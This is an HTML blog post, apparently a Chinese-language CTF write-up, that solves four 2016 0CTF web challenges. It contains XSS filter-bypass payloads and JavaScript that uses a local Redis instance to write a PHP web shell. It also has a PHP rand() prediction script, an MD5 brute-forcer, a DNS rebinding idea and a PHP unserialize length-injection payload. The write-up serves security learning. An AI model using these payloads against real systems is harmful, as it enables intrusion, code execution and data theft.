@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+<meta charset="utf-8" />
+<meta name="author" content="" />
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+<meta name="generator" content="Hugo 0.26" />
+
+<link rel="canonical" href="http://caijiji.github.io/2016/03/15/0ctf-web-writeup/">
+<base href="http://caijiji.github.io/" />
+<meta property="og:title" content="0CTF-Web-Writeup" />
+<meta property="og:description" content="2016 0CTF Web WriteUp
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://caijiji.github.io/2016/03/15/0ctf-web-writeup/" />
+
+
+
+<meta property="article:published_time" content="2016-03-15T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2016-03-15T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="0CTF-Web-Writeup"/>
+<meta name="twitter:description" content="2016 0CTF Web WriteUp
+
+"/>
+
+
+
+<meta itemprop="name" content="0CTF-Web-Writeup">
+<meta itemprop="description" content="2016 0CTF Web WriteUp
+
+">
+
+
+<meta itemprop="dateModified" content="2016-03-15T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="666">
+
+
+
+<meta itemprop="keywords" content="Hacking," />
+
+
+<link rel="stylesheet" href="css/layout.css" />
+<link rel="stylesheet" href="css/color-dark.css" />
+
+
+
+<title>
+
+
+     0CTF-Web-Writeup 
+
+</title>
+
+<script src="js/highlight.min.js"></script>
+<link rel="stylesheet" href="css/tomorrow-night.min.css" />
+<script>hljs.initHighlightingOnLoad();</script>
+
+</head>
+
+
+<body>
+<div class="main">
+<header>
+
+<div class="header-bar">
+
+  <nav>
+    <div class="siteTitle">
+      <a href="http://caijiji.github.io/">菜狗小陈</a>
+    </div> 
+
+    
+    
+    <a class="nav-item" href="/about/"><div class="nav-item-title">About</div></a>
+    
+    <a class="nav-item" href="/friend/"><div class="nav-item-title">Friend</div></a>
+    
+    <a class="nav-item" href="https://Github.com/Caijiji"><div class="nav-item-title">GitHub</div></a>
+    
+    <a class="nav-item" href="https://twitter.com/Croxy_cn"><div class="nav-item-title">Twitter</div></a>
+    
+
+  </nav>
+</div>
+
+  
+<div class="social-links-header">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</div>
+
+
+</header>
+
+
+<article class="post">
+    <h1 class="title"> 0CTF-Web-Writeup </h1>
+    <div class="content"> <h2 id="2016-0ctf-web-writeup">2016 0CTF Web WriteUp</h2>
+
+<p></p>
+
+<h3 id="guestbook">GuestBook</h3>
+
+<p>题目很明显的提示要获取httponly下的cookie  所以想到的是构造一个xss盲打 根据show.php返回的内容</p>
+
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+    &lt;script&gt;var debug=false;&lt;/script&gt;
+    &lt;div id=&quot;xx&quot;&gt;
+        &lt;h2&gt;xx&lt;/h2&gt;
+    &lt;/div&gt;
+    &lt;div id=&quot;text&quot;&gt;&lt;/div&gt;
+    &lt;script&gt;
+    data = &quot;xxx&quot;
+    t = document.getElementById(&quot;text&quot;)
+    if(debug){
+        t.innerHTML=data
+    }else{
+        t.innerText=data
+    }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Element.innerHTML是可以执行js的 但是debug默认是false 所以输出会以Text输出 而且在输入数据的时候 过滤了&lt; &gt; &lsquo; &ldquo; 之类的关键字</p>
+
+<p>可以直接用hex绕过对&lt;的过滤 post Message为</p>
+
+<pre><code>   \\x3cimg src=x onerror=alert(1)\\x3e
+</code></pre>
+
+<p>就能绕过最基本的过滤了 现在要考虑的是如何让debug为True</p>
+
+<p>按照常规的话  管理员的游览器应该是Chrome 所以Chrome还有自身的XSS Auditor.</p>
+
+<p>但是这个XSS Auditor在这里还有其他用处。</p>
+
+<p>如果我们建立一个secret像<script>var debug=false;</script>然后请求show.php时 XSS Auditor会认为debug=false是危险的行为</p>
+
+<p>然后游览器会直接忽略debug=false. 但是我们现在debug还未定义</p>
+
+<p>我们可以发现username直接被当成了div中的id</p>
+
+<p><a href="http://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables">Look it</a></p>
+
+<p>在Chrome中HTML element中的id将会自动成为JavaScript中的变量</p>
+
+<p>所以只要提交username为debug就能让debug有定义了</p>
+
+<p>payload</p>
+
+<pre><code>Secret:
+xxootest&lt;script&gt;var debug=false;&lt;/script&gt;
+
+Username:
+debug
+
+Message:
+\\x3cimg src=a onerror=\\u0022eval(String.fromCharCode(97,108,101,114,116,40,49,41))\\u0022\\x3e
+</code></pre>
+
+<p>之后获取管理员的请求头信息</p>
+
+<p>可以得到</p>
+
+<pre><code>Referer: http://127.0.0.1:8888/admin/show.php?secret=xxootest&lt;script&gt;var debug=false;&lt;/script&gt;
+</code></pre>
+
+<p>所以直接获取admin/show.php中的源码 可以得到提示</p>
+
+<pre><code>change log: use http-only cookie to prevent cookie stealing by xss, so flag is safe in cookie always check /admin/server_info.php for load balancing 
+to do: files and folders permission control, disallow other users write file into uploads folder
+</code></pre>
+
+<p>server_info.php类似一个探针 所以要获取http only的cookie方法已经很明显了</p>
+
+<p>获取server_info.php?act=phpinfo源码 得到phpinfo中cookie信息 也无需考虑http only了</p>
+
+<p>在获取到phpinfo的信息时 也可以发现</p>
+
+<p>web路径</p>
+
+<pre><code> /usr/share/nginx/html/
+</code></pre>
+
+<p>服务器还开启了<strong>Redis</strong></p>
+
+<p>所以就想到通过Redis写WebSHell</p>
+
+<p>但是我们只有一个Xss  通过一番搜索</p>
+
+<p><a href="http://drops.wooyun.org/papers/3062">http://drops.wooyun.org/papers/3062</a></p>
+
+<p>我们可以通过post来实现写入WebShell</p>
+
+<p>payload</p>
+
+<pre><code>f=document.createElement('form');
+[
+    'CONFIG SET dir /usr/share/nginx/html/uploads/',
+    'CONFIG SET dbfilename alizee_1s_l0v3.php',
+    'SET PAYLOAD &quot;&lt;?php system($_GET[1]);&gt;&quot;','BGSAVE'
+].forEach(function(e){
+var i=document.createElement('input');
+i.name='a';i.value=e;
+f.appendChild(i);
+});
+f.method='POST';
+f.action='http://127.0.0.1:6379/';
+f.enctype='multipart/form-data';
+f.submit();
+</code></pre>
+
+<p>拿到WebShell后 服务器还有open basedir disable_function
+通过</p>
+
+<p><a href="https://rdot.org/forum/showpost.php?p=38750&amp;postcount=16">https://rdot.org/forum/showpost.php?p=38750&amp;postcount=16</a></p>
+
+<p>绕过限制</p>
+
+<p>成功get flag</p>
+
+<h3 id="rand">Rand</h3>
+
+<pre><code>&lt;?php
+include('config.php');
+session_start();
+
+if($_SESSION['time'] &amp;&amp; time() - $_SESSION['time'] &gt; 60) {
+    session_destroy();
+    die('timeout');
+} else {
+    $_SESSION['time'] = time();
+}
+
+echo rand();
+if (isset($_GET['go'])) {
+    $_SESSION['rand'] = array();
+    $i = 5;
+    $d = '';
+    while($i--){
+        $r = (string)rand();
+        $_SESSION['rand'][] = $r;
+        $d .= $r;
+    }
+    echo md5($d);
+} else if (isset($_GET['check'])) {
+    if ($_GET['check'] === $_SESSION['rand']) {
+        echo $flag;
+    } else {
+        echo 'die';
+        session_destroy();
+    }
+} else {
+    show_source(__FILE__);
+}
+</code></pre>
+
+<p>From
+<a href="http://www.freebuf.com/articles/96599.html">http://www.freebuf.com/articles/96599.html</a></p>
+
+<p>根据随机数产生的规律 可以搜集大量样本预测下一个随机数为多少</p>
+
+<p>POC</p>
+
+<pre><code>import requests
+
+url = &quot;http://202.120.7.202:8888/&quot;
+for i in range(100):
+    l = []
+    q = []
+    s=requests.Session()
+    for j in range(50):
+        text = s.get(url).content.split('&lt;code&gt;')[0].strip()
+        l.append(int(text))
+    text = s.get(url+'?go').content
+    lens = len(text)-32
+    num = text[0:lens].strip()
+    md5 = text[lens:]
+    l.append(int(num))
+    for i in range(5):
+        index = len(l)
+        r = (int(l[index-3]+l[index-31]) % 2147483648)
+        q.append(r)
+        l.append(r)
+    tmp = ''
+    for i in range(len(q)):
+        shuzu = q[i]
+        checkurl = 'check[%s]=%s' %(i,shuzu)
+        if i == 4:
+            tmp = tmp+checkurl
+            break
+        tmp = tmp+checkurl+'&amp;'
+    target = url+'?'+tmp
+    print target
+    texts = s.get(target).content
+    print texts
+</code></pre>
+
+<h3 id="monkey">Monkey</h3>
+
+<p>先写了个脚本来爆MD5</p>
+
+<pre><code>#!/usr/bin/env python  
+#coding:utf-8  
+  
+import sys  
+import string  
+import itertools  
+import md5
+import time
+
+def get_strings():  
+    chars=string.printable[:62]  
+    strings=[]  
+    for i in xrange(min,max+1):  
+        strings.append((itertools.product(chars,repeat=i),))  
+    return itertools.chain(*strings)  
+  
+def make_dict(files):  
+    for x in list_str:  
+        for y in x:
+            #print &quot;88316675d7882e3fdbe066000273842c&quot;+&quot;&quot;.join(y)
+            #time.sleep(5)
+            aq = md5.new()
+            aq.update(&quot;&quot;.join(y))
+            head = aq.hexdigest()[0:6]
+            if head == files:
+                print &quot;&quot;.join(y)
+            #time.sleep(5)
+            #print &quot;&quot;.join(y)
+    print 'Done'  
+  
+while True:  
+    if len(sys.argv)==4:  
+        try:  
+            min = int(sys.argv[1])  
+            max = int(sys.argv[2])  
+        except:  
+            print &quot;wrong&quot;  
+            sys.exit(0)  
+        if min &lt;= max:  
+            list_str= get_strings()
+            #print list_str 
+            files=sys.argv[3]  
+            make_dict(files)  
+</code></pre>
+
+<p><strong>python 2.py 1 5 c4f8004</strong></p>
+
+<p>得到所需的字符</p>
+
+<p>robot会访问我们提供的url 但是目的是得到127.0.0.1的源码 如果直接用jquery请求的话是跨域 不能实现</p>
+
+<p>题目提醒robot会停留2min&hellip;</p>
+
+<p>From
+<a href="https://www.defcon.org/images/defcon-18/dc-18-presentations/Heffner/DEFCON-18-Heffner-Routers.pdf">https://www.defcon.org/images/defcon-18/dc-18-presentations/Heffner/DEFCON-18-Heffner-Routers.pdf</a></p>
+
+<p>一个很猥琐的思路产生了</p>
+
+<p>我们让robot访问我们的页面<a href="http://ctf.c-chicken.cc:8080/xx.html">http://ctf.c-chicken.cc:8080/xx.html</a></p>
+
+<p>然后在html设置一个延迟访问</p>
+
+<p>在延迟的这段时间 马上更改DNS 吧ctf.c-chicken.cc指向127.0.0.1 达到跨域的目的。。</p>
+
+<p>的确非常猥琐:)</p>
+
+<h3 id="paipaipai">paipaipai</h3>
+
+<p>查看源码</p>
+
+<pre><code>	public function filter($string) {
+		$escape = array('\'', '\\\\');
+		$escape = '/' . implode('|', $escape) . '/';
+		$string = preg_replace($escape, '_', $string);
+
+		$safe = array('select', 'insert', 'update', 'delete', 'where');
+		$safe = '/' . implode('|', $safe) . '/i';
+		return preg_replace($safe, 'hacker', $string);
+	}
+</code></pre>
+
+<p>注入的话 好像是不太可能的</p>
+
+<p>但是在update.php</p>
+
+<pre><code>&lt;?php
+	require_once('class.php');
+	if($_SESSION['username'] == null) {
+		die('Login First');	
+	}
+	if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) {
+
+		$username = $_SESSION['username'];
+		if(!preg_match('/^\d{11}$/', $_POST['phone']))
+			die('Invalid phone');
+
+		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
+			die('Invalid email');
+		
+		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)
+			die('Invalid nickname');
+
+		$file = $_FILES['photo'];
+		if($file['size'] &lt; 5 or $file['size'] &gt; 1000000)
+			die('Photo size error');
+
+		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
+		$profile['phone'] = $_POST['phone'];
+		$profile['email'] = $_POST['email'];
+		$profile['nickname'] = $_POST['nickname'];
+		$profile['photo'] = 'upload/' . md5($file['name']);
+
+		$user-&gt;update_profile($username, serialize($profile));
+		echo 'Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;';
+	}
+	else {
+?&gt;
+</code></pre>
+
+<p>profile.php</p>
+
+<pre><code>&lt;?php
+	require_once('class.php');
+	if($_SESSION['username'] == null) {
+		die('Login First');	
+	}
+	$username = $_SESSION['username'];
+	$profile=$user-&gt;show_profile($username);
+	if($profile  == null) {
+		header('Location: update.php');
+	}
+	else {
+		$profile = unserialize($profile);
+		$phone = $profile['phone'];
+		$email = $profile['email'];
+		$nickname = $profile['nickname'];
+		$photo = base64_encode(file_get_contents($profile['photo']));
+?&gt;
+</code></pre>
+
+<p>我们可以很明显的看到序列化和file_get_contents</p>
+
+<p>如果能控制profile[&lsquo;photo&rsquo;]我们不就可以实现任意文件读取了吗:）</p>
+
+<p>看update判断</p>
+
+<pre><code>$username = $_SESSION['username'];
+		if(!preg_match('/^\d{11}$/', $_POST['phone']))
+			die('Invalid phone');
+
+		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
+			die('Invalid email');
+		
+		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)
+			die('Invalid nickname');
+
+		$file = $_FILES['photo'];
+		if($file['size'] &lt; 5 or $file['size'] &gt; 1000000)
+			die('Photo size error');
+</code></pre>
+
+<p>我们看到只有nickname采用了OR判断 只要$_POST[&lsquo;nickname&rsquo;]不大于10的话 也就可以过判断了</p>
+
+<p>strlen(数组)的话 不管输入多少 得出来的都是0</p>
+
+<p>我们知道php在进行unserialize时 如果解出一个完整的序列化语句后 后面的字符就不会再进行解析了</p>
+
+<p>所以我们可以在nickname那里构造</p>
+
+<p><strong>xxx&rdquo;;}s:5:&ldquo;photo&rdquo;;s:10:&ldquo;config.php</strong></p>
+
+<p>但是我们会发现得到的是</p>
+
+<p><strong>{i:0;s:34:&ldquo;xxx&rdquo;;}s:5:&ldquo;photo&rdquo;;s:10:&ldquo;config.php&rdquo;;}</strong></p>
+
+<p>xxx的长度并和34不匹配 所以并不能成功构造出phone为config.php</p>
+
+<p>回过去看filter函数中  会把select insert where.. 之类的替换成hacker  那么如果我们提交where 5个字符 然后被替换成了hacker6个字符</p>
+
+<p>那么构造足够多的where不就可以达到长度的匹配了0.0</p>
+
+<p>payload</p>
+
+<pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php
+</code></pre>
+
+<p>GuestBook2参考<a href="https://blog.ka0labs.net/post/33/">https://blog.ka0labs.net/post/33/</a></p> </div>
+    <footer class="post-footer">
+
+  <div class="post-footer-data">
+    
+<div class="tags">
+    
+      <div class="tag">
+        <a href="/tags/hacking">#Hacking</a>
+      </div>
+    
+</div>
+
+    <div class="date"> Mar 15, 2016 </div>
+  </div>
+
+</footer>
+
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'Croxy';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>
+  Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+</article>
+
+  <footer>
+
+  <div class="social-links-footer">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <div class="social-link">
+  <a href="http://caijiji.github.io/index.xml" target="_blank">RSS</a>
+  </div>
+
+</div>
+
+
+  <div class="copyright">  </div>
+
+  <div class="poweredby">
+    Powered by <a href="https://gohugo.io/">Hugo</a>.
+  </div>
+
+  </footer>
+
+</body>
+</html>
+
